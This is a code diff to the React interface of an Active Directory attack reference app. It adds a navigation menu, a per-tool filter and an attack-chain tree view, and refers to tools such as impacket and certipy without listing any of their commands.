+            <span className="text-[11px] tracking-[0.18em] uppercase" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
+              Menu
+            </span>
+          </div>
+          <button
+            onClick={onClose}
+            aria-label="Close menu"
+            className="flex items-center justify-center rounded-md transition-colors"
+            style={{ width: 26, height: 26, color: STRUCTURAL }}
+            onMouseEnter={(e) => {
+              e.currentTarget.style.color = TEXT_PRIMARY;
+              e.currentTarget.style.background = BORDER_1;
+            }}
+            onMouseLeave={(e) => {
+              e.currentTarget.style.color = STRUCTURAL;
+              e.currentTarget.style.background = "transparent";
+            }}
+          >
+            <X size={15} />
+          </button>
+        </div>
+        <div className="flex-1 overflow-y-auto py-2">
+          {navItems.map((item) => (
+            <MenuNavItem key={`${item.kind}-${item.id}`} item={item} active={isActive(item)} onClick={() => select(item)} />
+          ))}
+        </div>
+
+        {/* External references — the project's own repo plus the two upstream
+            reference sites (GTFOBins, revshells.com) this dataset draws on/pairs with. */}
+        <div className="py-2" style={{ borderTop: `1px solid ${BORDER_1}` }}>
+          {links.map((link) => (
+            <MenuLink key={link.label} {...link} />
+          ))}
+        </div>
+      </div>
+    </>
+  );
+}
+
+// ============================================================
+// TOOLS FACET — the ~90 distinct tool names across ENTRIES, grouped
+// alphabetically with their own scroll region so the sidebar doesn't
+// have to grow to fit them. Click a tool to narrow Commands to just
+// that tool's entries; click again to clear.
+// ============================================================
+function ToolsFacet({ activeTool, setActiveTool }) {
+  const toolGroups = useMemo(() => {
+    const names = [...new Set(ENTRIES.map((e) => e.tool))].sort((a, b) => a.localeCompare(b));
+    const groups = new Map();
+    for (const name of names) {
+      const letter = /[A-Za-z]/.test(name[0]) ? name[0].toUpperCase() : "#";
+      if (!groups.has(letter)) groups.set(letter, []);
+      groups.get(letter).push(name);
+    }
+    return [...groups.entries()].sort(([a], [b]) => a.localeCompare(b));
+  }, []);
+
+  return (
+    <div
+      className="rounded-lg border shrink-0 flex flex-col"
+      style={{ width: 200, background: SURFACE, borderColor: BORDER_2, maxHeight: 640 }}
+    >
+      <div className="px-3 py-2.5 flex items-center justify-between" style={{ borderBottom: `1px solid ${BORDER_1}` }}>
+        <span className="text-[11px] uppercase tracking-wide font-semibold" style={{ color: TEXT_PRIMARY, fontFamily: FONT_MONO }}>
+          Tools
+        </span>
+        {activeTool !== "all" && (
+          <button
+            onClick={() => setActiveTool("all")}
+            className="text-[10px]"
+            style={{ color: SIGNATURE, fontFamily: FONT_MONO }}
+          >
+            Clear
+          </button>
+        )}
+      </div>
+      <div className="overflow-y-auto px-1 py-1">
+        {toolGroups.map(([letter, tools]) => (
+          <div key={letter}>
+            <div className="px-2 pt-2 pb-1 text-[10px]" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
+              {letter}
+            </div>
+            {tools.map((tool) => (
+              <button
+                key={tool}
+                onClick={() => setActiveTool(activeTool === tool ? "all" : tool)}
+                className="w-full text-left px-2 py-1 rounded text-[12px] truncate block"
+                style={{
+                  fontFamily: FONT_MONO,
+                  color: activeTool === tool ? SIGNATURE : TEXT_BODY,
+                  background: activeTool === tool ? SIGNATURE + "14" : "transparent",
+                }}
+                title={tool}
+              >
+                {tool}
+              </button>
+            ))}
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
 function VariablePanel({ values, setValues }) {
   const [open, setOpen] = useState(true);
   const filledCount = VARS.filter((v) => values[v.key]).length;
@@ -4617,20 +5594,121 @@ function EdgeCard({ edge, values }) {
   );
 }
 
-function EdgeExplorer({ values }) {
-  const [activeCat, setActiveCat] = useState("all");
+// One row of an attack chain tree. Connectors (├──/└──/│) are computed from
+// tree position, same algorithm the `tree` command uses, rather than
+// hand-authored per node — CHAINS only needs to supply nesting via `children`.
+// A node's `command` renders exactly like an EdgeCard step: run through
+// getCommandVariants (impacket .py vs impacket-* binary, certipy vs
+// certipy-ad, bloodyAD vs bloodyad — same dual-invocation logic Commands and
+// Edge Lookup already use) and applyAuthPreference, each variant shown via
+// CommandLine with its own CopyButton.
+function ChainNode({ node, prefix, isLast, depth, color, values }) {
+  const connector = depth === 0 ? "" : isLast ? "└── " : "├── ";
+  const childPrefix = depth === 0 ? "" : prefix + (isLast ? "    " : "│   ");
+  const shell = shellOf({ tool: node.label, command: node.command || "" });
+  const variants = node.command
+    ? getCommandVariants(node.command).map((v) => ({ ...v, command: applyAuthPreference(v.command, values) }))
+    : [];
+  return (
+    <>
+      <div className="flex flex-wrap items-baseline gap-x-2 text-[13px] leading-[1.85]" style={{ fontFamily: FONT_MONO }}>
+        <span style={{ color: STRUCTURAL, whiteSpace: "pre" }} aria-hidden="true">
+          {prefix}
+          {connector}
+        </span>
+        <span style={{ color: depth === 0 ? TEXT_PRIMARY : color, fontWeight: depth === 0 ? 700 : 600 }}>{node.label}</span>
+        {node.note && (
+          <span className="text-[11px]" style={{ color: STRUCTURAL }}>
+            {node.note}
+          </span>
+        )}
+      </div>
+      {node.command && (
+        <div className="space-y-1.5 mb-1" style={{ paddingLeft: `${(prefix + connector).length}ch` }}>
+          {variants.map((v, vi) => (
+            <div key={vi} className="flex items-start gap-2">
+              <div className="flex-1 min-w-0">
+                {v.label && (
+                  <p className="text-[9px] uppercase tracking-wide mb-0.5" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
+                    {v.label}
+                  </p>
+                )}
+                <div
+                  className="rounded-md px-2.5 py-1.5 text-[11px] overflow-x-auto whitespace-pre"
+                  style={{ background: VOID, color: TEXT_COMMAND, border: `1px solid ${BORDER_1}`, fontFamily: FONT_MONO }}
+                >
+                  <CommandLine command={v.command} values={values} shell={shell} />
+                </div>
+              </div>
+              <div className="mt-0.5 shrink-0">
+                <CopyButton text={substitute(v.command, values, shell)} />
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+      {node.children?.map((child, i) => (
+        <ChainNode
+          key={i}
+          node={child}
+          prefix={childPrefix}
+          isLast={i === node.children.length - 1}
+          depth={depth + 1}
+          color={color}
+          values={values}
+        />
+      ))}
+    </>
+  );
+}
 
-  const filtered = useMemo(() => {
-    return EDGES.filter((e) => activeCat === "all" || e.category === activeCat);
-  }, [activeCat]);
+function ChainCard({ chain, values }) {
+  const cat = edgeCategoryOf(chain.category);
+  const [hover, setHover] = useState(false);
+  return (
+    <div
+      onMouseEnter={() => setHover(true)}
+      onMouseLeave={() => setHover(false)}
+      className="rounded-lg border overflow-hidden transition-colors"
+      style={{ borderColor: hover ? cat.color + "40" : BORDER_2, background: SURFACE }}
+    >
+      <div className="px-4 pt-3.5 pb-3">
+        <span
+          className="text-[10px] uppercase tracking-wider font-semibold px-1.5 py-0.5 rounded"
+          style={{ color: cat.color, background: cat.color + "15", fontFamily: FONT_MONO }}
+        >
+          {cat.label}
+        </span>
+        <h3 className="text-[15px] leading-snug mt-1.5" style={{ fontFamily: FONT_MONO, fontWeight: 600, color: TEXT_PRIMARY }}>
+          {chain.title}
+        </h3>
+        <p className="text-[12px] mt-1 leading-relaxed" style={{ color: TEXT_BODY }}>
+          {chain.summary}
+        </p>
+      </div>
+      <div className="px-4 pb-4 pt-1 rounded-md mx-4 mb-4" style={{ background: VOID, border: `1px solid ${BORDER_1}` }}>
+        <div className="pt-2.5">
+          <ChainNode node={chain.root} prefix="" isLast={true} depth={0} color={cat.color} values={values} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ============================================================
+// ATTACK CHAINS EXPLORER — multi-edge exploitation paths, the
+// connective tissue EdgeExplorer's single-hop lookups don't show.
+// ============================================================
+function ChainExplorer({ values }) {
+  const [activeCat, setActiveCat] = useState("all");
+  const filtered = useMemo(() => CHAINS.filter((c) => activeCat === "all" || c.category === activeCat), [activeCat]);
+  const categoriesInUse = EDGE_CATEGORIES.filter((c) => CHAINS.some((ch) => ch.category === c.id));
 
   return (
     <div>
       <p className="text-xs mb-4 leading-relaxed max-w-2xl" style={{ color: STRUCTURAL }}>
-        Type the edge name BloodHound showed you into the search bar above — e.g.{" "}
-        <span className="font-mono" style={{ color: STRUCTURAL }}>GenericWrite</span> or{" "}
-        <span className="font-mono" style={{ color: STRUCTURAL }}>ADCS ESC1</span> — and get the connected command chain for exploiting it,
-        using the variables you set above. Use the filters below to just browse a category instead.
+        A single edge is one hop. A real BloodHound path is usually three to six of them, linked — these are the
+        connective chains: prerequisite → primitive → resulting identity → next hop.
       </p>
       <div className="flex flex-wrap gap-2 mb-6">
         <button
@@ -4642,10 +5720,10 @@ function EdgeExplorer({ values }) {
             border: `1px solid ${BORDER_3}`,
           }}
         >
-          All ({EDGES.length})
+          All ({CHAINS.length})
         </button>
-        {EDGE_CATEGORIES.map((c) => {
-          const count = EDGES.filter((e) => e.category === c.id).length;
+        {categoriesInUse.map((c) => {
+          const count = CHAINS.filter((ch) => ch.category === c.id).length;
           const active = activeCat === c.id;
           return (
             <button
@@ -4664,13 +5742,78 @@ function EdgeExplorer({ values }) {
         })}
       </div>
       {filtered.length === 0 ? (
-        <div className="text-center py-16 text-sm font-mono" style={{ color: STRUCTURAL }}>No edges match that query.</div>
+        <div className="text-center py-16 text-sm font-mono" style={{ color: STRUCTURAL }}>No chains match that filter.</div>
       ) : (
         <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-          {filtered.map((e) => (
-            <EdgeCard key={e.id} edge={e} values={values} />
+          {filtered.map((c) => (
+            <ChainCard key={c.id} chain={c} values={values} />
           ))}
         </div>
+      )}
+    </div>
+  );
+}
+
+function EdgeExplorer({ values, mode = "edges" }) {
+  const [activeCat, setActiveCat] = useState("all");
+
+  const filtered = useMemo(() => {
+    return EDGES.filter((e) => activeCat === "all" || e.category === activeCat);
+  }, [activeCat]);
+
+  return (
+    <div>
+      {mode === "chains" ? (
+        <ChainExplorer values={values} />
+      ) : (
+        <>
+          <p className="text-xs mb-4 leading-relaxed max-w-2xl" style={{ color: STRUCTURAL }}>
+            Type the edge name BloodHound showed you into the search bar above — e.g.{" "}
+            <span className="font-mono" style={{ color: STRUCTURAL }}>GenericWrite</span> or{" "}
+            <span className="font-mono" style={{ color: STRUCTURAL }}>ADCS ESC1</span> — and get the connected command chain for exploiting it,
+            using the variables you set above. Use the filters below to just browse a category instead.
+          </p>
+          <div className="flex flex-wrap gap-2 mb-6">
+            <button
+              onClick={() => setActiveCat("all")}
+              className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
+              style={{
+                background: activeCat === "all" ? BORDER_3 : "transparent",
+                color: activeCat === "all" ? TEXT_PRIMARY : STRUCTURAL,
+                border: `1px solid ${BORDER_3}`,
+              }}
+            >
+              All ({EDGES.length})
+            </button>
+            {EDGE_CATEGORIES.map((c) => {
+              const count = EDGES.filter((e) => e.category === c.id).length;
+              const active = activeCat === c.id;
+              return (
+                <button
+                  key={c.id}
+                  onClick={() => setActiveCat(c.id)}
+                  className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
+                  style={{
+                    background: active ? c.color + "15" : "transparent",
+                    color: active ? c.color : STRUCTURAL,
+                    border: `1px solid ${active ? c.color + "55" : BORDER_3}`,
+                  }}
+                >
+                  {c.label} ({count})
+                </button>
+              );
+            })}
+          </div>
+          {filtered.length === 0 ? (
+            <div className="text-center py-16 text-sm font-mono" style={{ color: STRUCTURAL }}>No edges match that query.</div>
+          ) : (
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              {filtered.map((e) => (
+                <EdgeCard key={e.id} edge={e} values={values} />
+              ))}
+            </div>
+          )}
+        </>
       )}
     </div>
   );
@@ -4918,14 +6061,19 @@ function CVEExplorer({ onSeeAlso }) {
 
 export default function ADArsenal() {
   const [view, setView] = useState("commands"); // "commands" | "edges" | "learnbook"
+  const [edgeMode, setEdgeMode] = useState("edges"); // "edges" | "chains" — which lens the edges view uses
   const [activePhase, setActivePhase] = useState("all");
+  const [activeTool, setActiveTool] = useState("all");
+  const [menuOpen, setMenuOpen] = useState(false);
   const [values, setValues] = useState({});
   const [globalQuery, setGlobalQuery] = useState("");
   const [theme, setTheme] = useState("dark"); // "dark" | "light"
 
   const filtered = useMemo(() => {
-    return ENTRIES.filter((e) => activePhase === "all" || e.phase === activePhase);
-  }, [activePhase]);
+    return ENTRIES.filter(
+      (e) => (activePhase === "all" || e.phase === activePhase) && (activeTool === "all" || e.tool === activeTool)
+    );
+  }, [activePhase, activeTool]);
 
   // Searches Commands + Attack Paths + Learnbook simultaneously, regardless
   // of which tab is currently active — separate from the per-tab search
@@ -4967,6 +6115,27 @@ export default function ADArsenal() {
   return (
     <div className="ad-arsenal-root min-h-screen w-full" data-theme={theme} style={{ background: VOID, fontFamily: FONT_SANS }}>
       <GlobalStyle />
+
+      {/* Standalone menu trigger — icon-only, pinned to the viewport corner like an
+          app chrome control, deliberately separate from the header's action buttons. */}
+      <button
+        onClick={() => setMenuOpen(true)}
+        aria-label="Open menu"
+        className="fixed flex items-center justify-center rounded-md transition-colors"
+        style={{
+          top: 20,
+          left: 20,
+          width: 34,
+          height: 34,
+          zIndex: 30,
+          background: SURFACE,
+          border: `1px solid ${BORDER_2}`,
+          color: STRUCTURAL,
+        }}
+      >
+        <Menu size={16} />
+      </button>
+
       <div className="max-w-5xl mx-auto px-5 py-10">
         {/* Header */}
         <div className="mb-8">
@@ -4991,46 +6160,34 @@ export default function ADArsenal() {
                 Active Directory Attack Reference
               </span>
             </div>
-            <button
-              onClick={() => setTheme(theme === "dark" ? "light" : "dark")}
-              aria-label={theme === "dark" ? "Switch to day theme" : "Switch to night theme"}
-              className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-md text-[11px] transition-colors"
-              style={{ background: SURFACE, border: `1px solid ${BORDER_2}`, color: STRUCTURAL, fontFamily: FONT_MONO }}
-            >
-              {theme === "dark" ? <Sun size={13} /> : <Moon size={13} />}
-              {theme === "dark" ? "Day" : "Night"}
-            </button>
+            <div className="flex items-center gap-2">
+              <button
+                onClick={() => setTheme(theme === "dark" ? "light" : "dark")}
+                aria-label={theme === "dark" ? "Switch to day theme" : "Switch to night theme"}
+                className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-md text-[11px] transition-colors"
+                style={{ background: SURFACE, border: `1px solid ${BORDER_2}`, color: STRUCTURAL, fontFamily: FONT_MONO }}
+              >
+                {theme === "dark" ? <Sun size={13} /> : <Moon size={13} />}
+                {theme === "dark" ? "Day" : "Night"}
+              </button>
+            </div>
           </div>
 
           <DITHero counts={{ entries: ENTRIES.length, edges: EDGES.length, learn: LEARN.length, cves: CVES.length }} />
         </div>
 
-        <div className="mb-8" style={{ borderBottom: `1px solid ${BORDER_1}` }} />
+        <MenuDrawer
+          open={menuOpen}
+          onClose={() => setMenuOpen(false)}
+          view={view}
+          setView={setView}
+          activePhase={activePhase}
+          setActivePhase={setActivePhase}
+          edgeMode={edgeMode}
+          setEdgeMode={setEdgeMode}
+        />
 
-        {/* View tabs */}
-        <div
-          className="flex gap-1 mb-6 p-1 rounded-lg w-fit"
-          style={{ background: SURFACE, border: `1px solid ${BORDER_2}`, fontFamily: FONT_MONO, opacity: globalQuery ? 0.4 : 1, pointerEvents: globalQuery ? "none" : "auto" }}
-        >
-          {[
-            { id: "commands", label: "CN=Commands" },
-            { id: "edges", label: "CN=AttackPaths" },
-            { id: "learnbook", label: "CN=Learnbook" },
-            { id: "cves", label: "CN=CVEs" },
-          ].map((t) => (
-            <button
-              key={t.id}
-              onClick={() => setView(t.id)}
-              className="text-[12px] font-medium px-3.5 py-1.5 rounded-md transition-colors"
-              style={{
-                background: view === t.id ? SIGNATURE + "1F" : "transparent",
-                color: view === t.id ? SIGNATURE : STRUCTURAL,
-              }}
-            >
-              {t.label}
-            </button>
-          ))}
-        </div>
+        <div className="mb-8" style={{ borderBottom: `1px solid ${BORDER_1}` }} />
 
         <VariablePanel values={values} setValues={setValues} />
 
@@ -5134,56 +6291,57 @@ export default function ADArsenal() {
         ) : (
           <>
             {view === "commands" && (
-              <>
-                {/* Phase filters */}
-                <div className="flex flex-wrap gap-2 mb-8">
-                  <button
-                    onClick={() => setActivePhase("all")}
-                    className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
-                    style={{
-                      background: activePhase === "all" ? BORDER_3 : "transparent",
-                      color: activePhase === "all" ? TEXT_PRIMARY : STRUCTURAL,
-                      border: `1px solid ${activePhase === "all" ? SIGNATURE + "55" : BORDER_3}`,
-                    }}
-                  >
-                    All ({ENTRIES.length})
-                  </button>
-                  {PHASES.map((p) => {
-                    const count = ENTRIES.filter((e) => e.phase === p.id).length;
-                    const active = activePhase === p.id;
-                    return (
+              <div className="flex gap-5 items-start">
+                <ToolsFacet activeTool={activeTool} setActiveTool={setActiveTool} />
+
+                <div className="flex-1 min-w-0">
+                  {/* Active filters — phase/tool now live in the Menu drawer and the
+                      Tools facet, so this chip row is what tells you what's applied. */}
+                  <div className="flex flex-wrap items-center gap-2 mb-6">
+                    <span className="text-xs" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
+                      {filtered.length} / {ENTRIES.length}
+                    </span>
+                    {activePhase !== "all" && (
                       <button
-                        key={p.id}
-                        onClick={() => setActivePhase(p.id)}
-                        className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
+                        onClick={() => setActivePhase("all")}
+                        className="flex items-center gap-1 text-xs font-medium px-2.5 py-1 rounded-full transition-colors"
                         style={{
-                          background: active ? p.bg : "transparent",
-                          color: active ? p.color : STRUCTURAL,
-                          border: `1px solid ${active ? p.color + "55" : BORDER_3}`,
+                          background: phaseOf(activePhase).bg,
+                          color: phaseOf(activePhase).color,
+                          border: `1px solid ${phaseOf(activePhase).color}55`,
                         }}
                       >
-                        {p.label} ({count})
+                        {phaseOf(activePhase).label} <X size={11} />
                       </button>
-                    );
-                  })}
-                </div>
+                    )}
+                    {activeTool !== "all" && (
+                      <button
+                        onClick={() => setActiveTool("all")}
+                        className="flex items-center gap-1 text-xs font-medium px-2.5 py-1 rounded-full transition-colors"
+                        style={{ background: SIGNATURE + "14", color: SIGNATURE, border: `1px solid ${SIGNATURE}55` }}
+                      >
+                        {activeTool} <X size={11} />
+                      </button>
+                    )}
+                  </div>
 
-                {/* Results */}
-                {filtered.length === 0 ? (
-                  <div className="text-center py-16 text-sm" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
-                    No entries match that query.
-                  </div>
-                ) : (
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    {filtered.map((e) => (
-                      <EntryCard key={e.id} entry={e} values={values} />
-                    ))}
-                  </div>
-                )}
-              </>
+                  {/* Results */}
+                  {filtered.length === 0 ? (
+                    <div className="text-center py-16 text-sm" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
+                      No entries match that query.
+                    </div>
+                  ) : (
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      {filtered.map((e) => (
+                        <EntryCard key={e.id} entry={e} values={values} />
+                      ))}
+                    </div>
+                  )}
+                </div>
+              </div>
             )}
 
-            {view === "edges" && <EdgeExplorer values={values} />}
+            {view === "edges" && <EdgeExplorer values={values} mode={edgeMode} />}
 
             {view === "learnbook" && <Learnbook />}
 
